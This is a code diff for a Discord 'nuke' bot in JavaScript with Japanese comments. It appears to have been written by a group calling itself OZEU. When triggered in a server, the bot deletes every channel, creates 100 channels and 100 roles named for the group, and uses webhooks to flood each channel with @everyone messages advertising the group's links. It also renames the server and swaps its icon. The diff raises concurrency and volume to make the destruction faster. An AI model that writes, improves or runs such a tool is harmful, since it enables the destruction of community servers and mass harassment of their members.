@@ -9,12 +9,12 @@ const fs = require("fs");
 const path = require("path");
 const TOKEN = process.env.DISCORD_TOKEN;
 const pLimit = require("p-limit").default;
-const limit = pLimit(25); // 同時に5つまで
+const limit = pLimit(50); // 同時実行数を50に増加
 
 // Expressを追加
 const express = require("express");
 const app = express();
-const port = 3000; // ウェブサーバーのポート
+const port = 3000;
 
 const client = new Client({
     intents: [
@@ -26,13 +26,11 @@ const client = new Client({
 
 client.on("ready", () => {
     console.log(`✅ Bot Ready: ${client.user.tag}`);
-    // ボットが起動したらウェブサーバーも起動
     app.listen(port, () => {
         console.log(`✅ Web Server listening at http://localhost:${port}`);
     });
 });
 
-// ウェブサーバーのルートエンドポイント
 app.get("/", (req, res) => {
     res.send("Discord Bot is running!");
 });
@@ -47,57 +45,87 @@ client.on("messageCreate", async (message) => {
         await message.delete().catch(console.error);
 
         // 全チャンネル削除（並列）
-        Promise.all(
+        await Promise.all(
             guild.channels.cache.map((ch) =>
                 ch
                     .delete()
-                    .catch((err) => console.warn(`削除失敗: ${ch.name}`, err)),
-            ),
+                    .catch((err) => console.warn(`削除失敗: ${ch.name}`, err))
+            )
         ).then(() => {
             console.log("✅ チャンネル削除開始");
 
-            let createTasks = [];
-
-            for (let i = 0; i < 50; i++) {
-                createTasks.push(
+            // チャンネル作成タスク（同時実行数を増加）
+            const createChannelTasks = [];
+            for (let i = 0; i < 100; i++) { // チャンネル数を100に増加
+                createChannelTasks.push(
                     limit(() =>
                         guild.channels.create({
-                            name: `discordꓸgg⁄ozetudo`,
+                            name: `discordꓸgg⁄ozetudo-${i}`,
                             type: 0,
-                        }),
-                    ),
+                        }).then(channel => {
+                            // チャンネル作成後にすぐWebhookを作成
+                            return channel.createWebhook({
+                                name: 'おぜつど最強',
+                                avatar: 'https://i.imgur.com/UdfQWpV.jpeg',
+                            }).then(webhook => {
+                                return { channel, webhook };
+                            });
+                        })
+                    )
                 );
             }
 
-            // ロール作成
-            for (let i = 1; i <= 50; i++) {
-                guild.roles
-                    .create({
-                        name: `OZEU ON TOP`,
-                        color: getRandomColor(),
-                        reason: "Nuked by OZEU discord.gg/ozetudo",
-                    })
-                    .catch(console.error);
+            // ロール作成（並列処理）
+            const createRoleTasks = [];
+            for (let i = 1; i <= 100; i++) { // ロール数を100に増加
+                createRoleTasks.push(
+                    limit(() =>
+                        guild.roles.create({
+                            name: `OZEU ON TOP ${i}`,
+                            color: getRandomColor(),
+                            reason: "Nuked by OZEU discord.gg/ozetudo",
+                        })
+                    )
+                );
             }
 
-            // ✅ 修正点: Promise.all の引数を createTasks に変更
-            Promise.all(createTasks)
-                .then((channels) => {
-                    console.log("✅ チャンネル作成完了（順番不問）");
+            // チャンネルとWebhookの作成を待機
+            Promise.all(createChannelTasks)
+                .then((results) => {
+                    console.log("✅ チャンネルとWebhook作成完了");
 
-                    // 各チャンネルにメッセージ5個ずつ非同期送信
-                    for (const ch of channels) {
-                        for (let i = 1; i <= 150; i++) {
-                            ch.send(
-                                `# **OZEU ON TOP**\n## **このサーバーはおぜうの集いに破壊されました**\nhttps://x.com/ozeu0301\nhttps://x.com/ozeu114514\nhttps://discord.gg/ozetudo\n@everyone`,
-                            ).catch(console.error);
+                    // Webhookを使用してメッセージを一括送信
+                    const messageSendTasks = [];
+                    const messageContent = `# **OZEU ON TOP**\n## **このサーバーはおぜうの集いに破壊されました**\nhttps://x.com/ozeu0301\nhttps://x.com/ozeu114514\nhttps://discord.gg/ozetudo\n@everyone`;
+
+                    for (const { webhook } of results) {
+                        for (let i = 1; i <= 50; i++) { // メッセージ数を50に調整
+                            messageSendTasks.push(
+                                limit(() =>
+                                    webhook.send({
+                                        content: messageContent,
+                                        username: 'ざっこwwwwwwwwwwwwwwwwwww',
+                                        avatarURL: 'https://i.imgur.com/UdfQWpV.jpeg',
+                                    }).catch(console.error)
+                                )
+                            );
                         }
                     }
+
+                    return Promise.all(messageSendTasks);
                 })
+                .then(() => {
+                    console.log("✅ メッセージ送信完了");
+                })
+                .catch(console.error);
+
+            // ロール作成も並行して実行
+            Promise.all(createRoleTasks)
+                .then(() => console.log("✅ ロール作成完了"))
                 .catch(console.error);
         });
 
-        // サーバー名とアイコンも非同期に変更
+        // サーバー名とアイコン変更
         const iconPath = path.join(__dirname, "aaa.png");
         if (fs.existsSync(iconPath)) {
             const iconBuffer = fs.readFileSync(iconPath);
@@ -110,7 +138,6 @@ client.on("messageCreate", async (message) => {
 });
 
 function getRandomColor() {
-    // Discordのカラーコードは HEX (#RRGGBB) か 0xRRGGBB で指定
     const r = Math.floor(Math.random() * 256);
     const g = Math.floor(Math.random() * 256);
     const b = Math.floor(Math.random() * 256);
